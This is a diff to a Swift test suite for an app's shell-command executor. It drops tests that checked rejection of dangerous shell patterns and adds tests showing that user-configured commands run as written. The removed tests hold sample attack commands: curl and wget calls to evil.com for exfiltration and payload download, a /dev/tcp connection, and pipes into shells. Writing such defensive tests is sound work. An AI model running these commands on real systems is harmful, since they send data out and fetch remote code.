@@ -3,11 +3,11 @@ import XCTest
 
 /// Tests for security hardening of SystemCommandExecutor:
 /// - URL scheme validation in openLink()
-/// - Shell command logging and input validation in executeSilently()
+/// - Shell command execution behavior in executeSilently()
 ///
-/// Rejection tests use marker files: the command attempts to create a temp file,
-/// then the test asserts the file was NOT created (proving the command was rejected).
-/// Safe-command tests assert the marker file IS created (proving execution occurred).
+/// Marker-file tests assert whether commands actually ran. Shell commands are
+/// executed as explicit user configuration; external-profile safety is handled at
+/// import/review boundaries, not by a brittle shell syntax blocklist.
 @MainActor
 final class SystemCommandExecutorSecurityTests: XCTestCase {
     private var profileManager: ProfileManager!
@@ -176,7 +176,7 @@ final class SystemCommandExecutorSecurityTests: XCTestCase {
         try? FileManager.default.removeItem(atPath: marker)
     }
 
-    // MARK: - executeSilently: Dangerous Pattern Rejection (marker file NOT created)
+    // MARK: - executeSilently: Explicit User Commands Execute
 
     func testShellCommand_RejectsEmptyCommand() async {
         // Empty command is rejected before Process.run(), so nothing executes
@@ -191,164 +191,39 @@ final class SystemCommandExecutorSecurityTests: XCTestCase {
         // No marker to check — whitespace command can't create one. Verify no crash.
     }
 
-    func testShellCommand_RejectsBacktickSubstitution() async {
+    func testShellCommand_AllowsCommandSubstitutionWhenUserConfigured() async {
         let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) && echo `whoami`", inTerminal: false))
+        executor.execute(.shellCommand(command: "value=$(printf ok); test \"$value\" = ok && touch \(marker)", inTerminal: false))
         try? await Task.sleep(nanoseconds: Self.executionDelay)
 
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Command with backtick substitution should be rejected and not execute")
+        XCTAssertTrue(FileManager.default.fileExists(atPath: marker),
+                      "Explicit user shell commands are executed as-is")
+        try? FileManager.default.removeItem(atPath: marker)
     }
 
-    func testShellCommand_RejectsDollarParenSubstitution() async {
+    func testShellCommand_AllowsPipelinesWhenUserConfigured() async {
         let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) && echo $(whoami)", inTerminal: false))
+        executor.execute(.shellCommand(command: "printf ok | cat > \(marker)", inTerminal: false))
         try? await Task.sleep(nanoseconds: Self.executionDelay)
 
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Command with $() substitution should be rejected and not execute")
+        let contents = try? String(contentsOfFile: marker, encoding: .utf8)
+        XCTAssertEqual(contents, "ok")
+        try? FileManager.default.removeItem(atPath: marker)
     }
 
-    func testShellCommand_RejectsPipeToShell() async {
+    func testShellCommand_AllowsShellVariablesWhenUserConfigured() async {
         let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) | sh", inTerminal: false))
+        executor.execute(.shellCommand(command: "CK_MARKER=\(marker); touch \"$CK_MARKER\"", inTerminal: false))
         try? await Task.sleep(nanoseconds: Self.executionDelay)
 
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Pipe to sh should be rejected and not execute")
+        XCTAssertTrue(FileManager.default.fileExists(atPath: marker),
+                      "Explicit user shell commands are executed as-is")
+        try? FileManager.default.removeItem(atPath: marker)
     }
 
-    func testShellCommand_RejectsPipeToBash() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) | bash", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Pipe to bash should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsPipeToZsh() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) | zsh", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Pipe to zsh should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsPipeToShellNoSpace() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker)|sh", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Pipe to sh (no space) should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsPipeToAbsoluteShellPath() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) | /bin/sh", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Pipe to /bin/sh should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsChainedCurl() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker); curl http://evil.com/exfil?data=secret", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Chained curl should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsChainedWget() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker); wget http://evil.com/payload", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Chained wget should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsConditionalCurl() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) && curl http://evil.com", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Conditional curl should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsConditionalWget() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) && wget http://evil.com", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Conditional wget should be rejected and not execute")
-    }
-
-    func testShellCommand_PatternDetectionIsCaseInsensitive() async {
-        let marker = markerPath()
-        // Should block even with mixed case
-        executor.execute(.shellCommand(command: "touch \(marker) | BASH", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Case-insensitive pattern matching should reject | BASH and not execute")
-    }
-
-    func testShellCommand_RejectsPipeToNode() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) | node -e 'process.exit()'", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Pipe to node should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsPipeToOsascript() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) | osascript -e 'quit'", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Pipe to osascript should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsShellVariableExpansion() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) && echo ${SHELL}", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Shell variable expansion ${} should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsHeredoc() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) && cat <<EOF\nhello\nEOF", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "Heredoc should be rejected and not execute")
-    }
-
-    func testShellCommand_RejectsDevTcp() async {
-        let marker = markerPath()
-        executor.execute(.shellCommand(command: "touch \(marker) && cat /dev/tcp/evil.com/80", inTerminal: false))
-        try? await Task.sleep(nanoseconds: Self.executionDelay)
-
-        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
-                        "/dev/tcp/ should be rejected and not execute")
-    }
-
-    // MARK: - executeSilently: Valid Commands That Resemble Patterns But Are Safe
+    // MARK: - executeSilently: Simple Commands
 
     func testShellCommand_AllowsSimpleEchoCommand() async {
-        // "echo hello" does not match any dangerous pattern
         let marker = markerPath()
         executor.execute(.shellCommand(command: "echo hello && touch \(marker)", inTerminal: false))
         try? await Task.sleep(nanoseconds: Self.executionDelay)
